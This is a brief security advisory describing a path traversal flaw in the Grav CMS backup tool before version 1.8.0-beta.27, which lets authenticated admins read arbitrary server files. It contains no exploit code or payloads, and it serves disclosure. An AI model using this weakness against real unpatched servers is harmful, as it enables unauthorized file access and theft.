Prior to 1.8.0-beta.27, A path traversal vulnerability has been identified in Grav CMS, allowing authenticated attackers with administrative privileges to read arbitrary files on the underlying server filesystem. This vulnerability arises due to insufficient input sanitization in the backup tool, where user-supplied paths are not properly restricted, enabling access to files outside the intended webroot directory.
